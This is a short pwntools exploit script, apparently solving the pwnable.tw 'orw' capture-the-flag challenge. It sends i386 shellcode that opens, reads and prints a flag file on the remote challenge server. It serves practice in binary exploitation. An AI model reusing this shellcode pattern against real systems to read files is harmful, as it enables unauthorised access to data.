#!/usr/bin/env python3
from pwn import *
from sys import argv
from struct import pack
context.arch='i386'
binary = ELF('orw', checksec=0)
# libc = ELF()
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('chall.pwnable.tw', 10001)
else:
  p = binary.process(env={})
s = lambda x, r="" : \
  p.sendafter(r, x) if r else p.send(x)
sl = lambda x, r="" : \
  p.sendlineafter(r, x) if r else p.sendline(x)

pause()
shellcode = shellcraft.i386.open('/home/orw/flag', 0)
shellcode += shellcraft.i386.read('eax', 'esp', 60)
shellcode += shellcraft.i386.write('1', 'esp', 60)
print(shellcode)
p.send(asm(shellcode))
p.interactive()

